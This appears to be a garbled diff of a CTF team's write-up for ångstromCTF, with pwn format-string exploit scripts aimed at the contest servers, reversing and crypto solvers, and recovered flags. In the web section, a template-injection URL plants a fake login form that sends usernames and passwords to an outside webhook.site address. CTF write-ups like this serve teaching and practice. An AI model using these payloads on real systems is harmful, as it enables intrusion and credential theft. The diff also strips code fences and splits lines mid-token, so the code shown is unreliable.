@@ -18,7 +18,7 @@ ChaMd5 Venom 招收大佬入圈
 from pwn import *
 from struct import pack
 from ctypes import *
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from hashlib import sha256
 import sys
 from pwnlib.util.iters import mbruteforce
@@ -40,10 +40,10 @@ def get_sb() : return libc_base + libc.sym['system'], libc_base + next(
 def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('challs.actf.co', 31402)
 elf = ELF('./pwn')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 for i in range(0x100):
@@ -55,15 +55,10 @@ for i in range(0x100):
     print(' +++++++++++++++ ', i)
     
 pr()
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from hashlib import sha256
 import sys
 from pwnlib.util.iters import mbruteforce
@@ -85,10 +80,10 @@ def get_sb() : return libc_base + libc.sym['system'], libc_base + next(
 def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('challs.actf.co', 31500)
 elf = ELF('./pwn')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # leak stack
@@ -107,7 +102,7 @@ sla(b'Professional): ', b'%9$px00')
 rl(b'0x')
 libc_base = int(p.recv(12), 16) - 0x2206a0
 
-#gdb.attach(p, 'b *$rebase(0x145b)')
+    #gdb.attach(p, 'b *$rebase(0x145b)')
 
 # set rbp -> rbp
 sla(b'Professional): ', b'%' + str(rbp&0xff).encode() + b'c%25$hhn')
@@ -144,16 +139,11 @@ sa(b'Professional): ', (b'%' + str((i + 3)&0xff).encode() + b'c%25$hhn')
 sla(b'Professional): ', b'%55$hhn')
 
 inter()
-#pause()
-```
-
-
-
-```
+    #pause()
 from pwn import *
 from struct import pack
 from ctypes import *
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from hashlib import sha256
 import sys
 from pwnlib.util.iters import mbruteforce
@@ -176,28 +166,18 @@ def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + 
 
 context(os='linux', arch='amd64', log_level='debug')
 p = process('./pwn')
-#p = remote('challs.actf.co', 31400)
+    #p = remote('challs.actf.co', 31400)
 elf = ELF('./pwn')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-#gdb.attach(p, 'b *$rebase(0x1262)')
+    #gdb.attach(p, 'b *$rebase(0x1262)')
 
 sla(b'leek? ', b'%*1$c%56c%13$n')
 sla(b'leek? ', b'%*12$c%' + str(0xa5916).encode() + b'c%42$n')
 
 inter()
-```
-
-
-
-```
 actf{ive_be3n_checkm4ted_21d1b2cebabf983f}
-```
-
-
-
-```
 a = 'anextremelycomplicatedkeythatisdefinitelyuselessss'
 b = [0x32, 0x26, 0x20, 0x3D, 0x24, 0x21, 0x2D, 0x28, 0x20, 0x3C, 0x2A, 0x2B, 0x2A, 0x28, 0x20, 0x3F, 0x21, 0x26, 0x24, 0x24, 0x36, 0x2C, 0x2E, 0x20, 0x29, 0x27, 0x20, 0x24, 0x31, 0x39, 0x20, 0x2C, 0x20, 0x23, 0x39, 0x3D, 0x21, 0x31, 0x20, 0x3C, 0x2A, 0x3D, 0x36, 0x20, 0x3C, 0x36, 0x3B, 0x36, 0x36, 0x23, 0x00]
 
@@ -206,36 +186,34 @@ for i in range(len(a)):
     result += chr(ord(a[i]) ^b[i])
 
 print(result)
-```
-
-
-
-```
 Module: Elixir.Bananas
 
 Attributes: [{vsn, [30426469076575DB017A805FDFD2503F]}]
 
 Compilation Info: [{version, 8.2.3}, {options, [no_spawn_compiler_process, from_core, no_core_prepare, no_auto_import]}, {source, /Users/alexahunleth/experiments/cybersec_challs/bananas/lib/bananas.ex}]
 
-//Function Elixir.Bananas:__info__/1
+//Function Elixir.Bananas:
+__info__/1
 label01: func_info Elixir.Bananas __info__ 1
 label02: select_val X[0] label09 [attributes, label08, compile, label08, deprecated, label07, exports_md5, label06, functions, label05, macros, label07, md5, label08, module, label04, struct, label03]
 label03: move nil X[0]
- return 
+ return
 label04: move Elixir.Bananas X[0]
- return 
+ return
 label05: move [{main, 0}, {main, 1}] X[0]
- return 
+ return
 label06: move T�}��|�6���� X[0]
- return 
+ return
 label07: move nil X[0]
- return 
+ return
 label08: move X[0] X[1]
  move Elixir.Bananas X[0]
- call_ext_only 2 erlang:get_module_info/2
+ call_ext_only 2 erlang:
+get_module_info/2
 label09: call_only 1 label30
 
-//Function Elixir.Bananas:check/1
+//Function Elixir.Bananas:
+check/1
 label10: func_info Elixir.Bananas check 1 //line lib/bananas.ex, 17
 label11: is_nonempty_list label12 X[0]
  get_list X[0] X[1] X[0]
@@ -245,43 +223,54 @@ label11: is_nonempty_list label12 X[0]
  bs_put_utf8 X[0] label79 X[5]
  move . X[0]
  test_heap 971 X[0]
- return 
+ return
 label12: move false X[0]
- return 
+ return
 
-//Function Elixir.Bananas:convert_input/1
+//Function Elixir.Bananas:
+convert_input/1
 label13: func_info Elixir.Bananas convert_input 1 //line lib/bananas.ex, 10
 label14: allocate 0 1
- call_ext 1 Elixir.String:trim/1 //line lib/bananas.ex, 12
- call_ext 1 Elixir.String:split/1 //line lib/bananas.ex, 13
+ call_ext 1 Elixir.String:
+trim/1 //line lib/bananas.ex, 12
+ call_ext 1 Elixir.String:
+split/1 //line lib/bananas.ex, 13
  call_last 1 label23 0
 
-//Function Elixir.Bananas:main/0
+//Function Elixir.Bananas:
+main/0
 label15: func_info Elixir.Bananas main 0 //line lib/bananas.ex, 3
 label16: move nil X[0]
  call_only 1 label18
 
-//Function Elixir.Bananas:main/1
+//Function Elixir.Bananas:
+main/1
 label17: func_info Elixir.Bananas main 1 //line lib/bananas.ex, 3
 label18: allocate 0 0
  move How many bananas do I have?
  X[0]
- call_ext 1 Elixir.IO:gets/1 //line lib/bananas.ex, 4
+ call_ext 1 Elixir.IO:
+gets/1 //line lib/bananas.ex, 4
  call 1 label14 //line lib/bananas.ex, 5
  call 1 label11 //line lib/bananas.ex, 6
  call_last 1 label20 0
 
-//Function Elixir.Bananas:print_flag/1
+//Function Elixir.Bananas:
+print_flag/1
 label19: func_info Elixir.Bananas print_flag 1 //line lib/bananas.ex, 25
 label20: is_eq_exact label21 X[0] true
  allocate 0 0
  move flag.txt X[0]
- call_ext 1 Elixir.File:read!/1 //line lib/bananas.ex, 30
- call_ext_last 1 Elixir.IO:puts/1 0 //line lib/bananas.ex, 31
+ call_ext 1 Elixir.File:
+read!/1 //line lib/bananas.ex, 30
+ call_ext_last 1 Elixir.IO:
+puts/1 0 //line lib/bananas.ex, 31
 label21: move Nope X[0]
- call_ext_only 1 Elixir.IO:puts/1 //line lib/bananas.ex, 26
+ call_ext_only 1 Elixir.IO:
+puts/1 //line lib/bananas.ex, 26
 
-//Function Elixir.Bananas:to_integer/1
+//Function Elixir.Bananas:
+to_integer/1
 label22: func_info Elixir.Bananas to_integer 1 //line lib/bananas.ex, 34
 label23: is_nonempty_list label24 X[0]
  get_list X[0] X[1] X[2]
@@ -291,35 +280,36 @@ label23: is_nonempty_list label24 X[0]
  allocate 1 3
  move X[2] Y[0]
  move X[1] X[0]
- call_ext 1 erlang:binary_to_integer/1 //line lib/bananas.ex, 35
+ call_ext 1 erlang:
+binary_to_integer/1 //line lib/bananas.ex, 35
  test_heap 2 1
  put_list X[0] Y[0] X[0]
  deallocate 1
- return 
-label24: return 
+ return
+label24: return
 
-//Function Elixir.Bananas:module_info/0
+//Function Elixir.Bananas:
+module_info/0
 label25: func_info Elixir.Bananas module_info 0
 label26: move Elixir.Bananas X[0]
- call_ext_only 1 erlang:get_module_info/1
+ call_ext_only 1 erlang:
+get_module_info/1
 
-//Function Elixir.Bananas:module_info/1
+//Function Elixir.Bananas:
+module_info/1
 label27: func_info Elixir.Bananas module_info 1
 label28: move X[0] X[1]
  move Elixir.Bananas X[0]
- call_ext_only 2 erlang:get_module_info/2
+ call_ext_only 2 erlang:
+get_module_info/2
 
 //Function Elixir.Bananas:-inlined-__info__/1-/1
 label29: func_info Elixir.Bananas -inlined-__info__/1- 1
 label30: jump label29
  int_code_end
-```
-
-
-
-```
-#gpt翻译一下，写个爆破脚本就行
-# -*- coding:UTF-8 -*-
+    #gpt翻译一下，写个爆破脚本就行
+# -*- coding:
+UTF-8 -*-
 from pwn import *
 import  time
 
@@ -352,18 +342,8 @@ while True:
         break
     r.close()
 # 关闭连接
-```
-
-
-
-```
 cards[id].type = type == "image/svg+xml" ? type : "text/plain";
 cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
-```
-
-
-
-```
 module.exports = {
     name: "brokenlogin",
     timeout: 7000,
@@ -399,11 +379,6 @@ module.exports = {
         await page.close();
     },
 };
-```
-
-
-
-```
 from flask import Flask, make_response, request, escape, render_template_string
 
 app = Flask(__name__)
@@ -415,19 +390,23 @@ indexPage = """
     <head>
         <title>Broken Login</title>
     </head>
-    <body>
-        <p style="color: red; fontSize: '28px';">%s</p>
-        <p>Number of failed logins: {{ fails }}</p>
+    
+        %s
+        Number of failed logins: {{ fails }}
         <form action="/" method="POST">
             <label for="username">Username: </label>
-            <input id="username" type="text" name="username" /><br /><br />
+            
+
+
 
             <label for="password">Password: </label>
-            <input id="password" type="password" name="password" /><br /><br />
+            
 
-            <input type="submit" />
+
+
+            
         </form>
-    </body>
+    
 </html>
 """
 
@@ -452,31 +431,20 @@ def login():
 
 if __name__ == "__main__":
     app.run("0.0.0.0")
-```
-
-
-
-```
 ?message={{request.args.a}}&a=
-```
-
-
-
-```
 https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=<form action="https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836" method="POST">
             <label for="username">Username: </label>
-            <input id="username" type="text" name="username" /><br /><br />
+            
+
+
 
             <label for="password">Password: </label>
-            <input id="password" type="password" name="password" /><br /><br />
+            
 
-            <input type="submit" />
+
+
+            
         </form>
-```
-
-
-
-```
 import string
 
 f = open("flag.txt").read()
@@ -492,11 +460,6 @@ for i in f:
         encrypted += i
 
 print(encrypted)
-```
-
-
-
-```
 import string
 c = "rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}"
 
@@ -509,11 +472,6 @@ for shift in range(26):
             plain += i
     print(plain)
 # actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}
-```
-
-
-
-```
 from Crypto.Util.number import getStrongPrime, bytes_to_long
 f = open("flag.txt").read()
 m = bytes_to_long(f.encode())
@@ -534,11 +492,6 @@ c = 40544832072726879770661606103417010618988078158535064967318135325645800905
 (p-2)*(q-1) = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230125943565148141498300205893475242956903188936949934637477735897301870046234768439825644866543391610507164360506843171701976641285249754264159339017466738250
 (p-1)*(q-2) = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230123577760657520479879758538312798938234126141096433998438004751495264208294710150161381066757910797946636886901614307738041629014360829994204066455759806614
 """
-```
-
-
-
-```
 import gmpy2
 from Crypto.Util.number import *
 
@@ -562,11 +515,6 @@ p = 12432413118408092556922180864578909882548688341838757808040464238372914542
 m = pow(c,gmpy2.invert(e, (p-1)*(q-1)), n)
 print(long_to_bytes(int(m)))
 # actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
-```
-
-
-
-```
 from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
 f = open("flag.txt").read()
 m = bytes_to_long(f.encode())
@@ -588,11 +536,6 @@ if c == m or b"actf{" in long_to_bytes(pow(c, d, n)):
     exit(1)
 
 print("m =", pow(c, d, n))
-```
-
-
-
-```
 from pwn import *
 from Crypto.Util.number import *
 sh = remote('challs.actf.co',32400)
@@ -610,11 +553,6 @@ while True:
     if b'actf' in long_to_bytes(M):
         print(long_to_bytes(M))  # actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}
         break
-```
-
-
-
-```
 #!/usr/local/bin/python
 
 def fake_psi(a, b):
@@ -648,22 +586,12 @@ y = int(input("y: "))
 
 if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
     print(open("flag.txt").read())
-```
-
-
-
-```
 from pwn import *
 sh =remote('challs.actf.co', 32200)
 sh.sendlineafter(b'x:', str(int('1'*65, 2)).encode())
 sh.sendlineafter(b'y:', str(int('1'*64, 2)).encode())
 sh.interactive()
 # actf{se3ms_pretty_p0ssible_t0_m3_7623fb7e33577b8a}
-```
-
-
-
-```
 #!/usr/local/bin/python
 import random
 
@@ -719,14 +647,10 @@ while True:
     print(query1(input("t> ")))
    case 2:
     print(query2(input("t> ")))
- except Exception as e:
+ 
+except Exception as e:
   print("Bad input, exiting", e)
   break
-```
-
-
-
-```
 import random
 from pwn import *
 # context.log_level = 'debug'
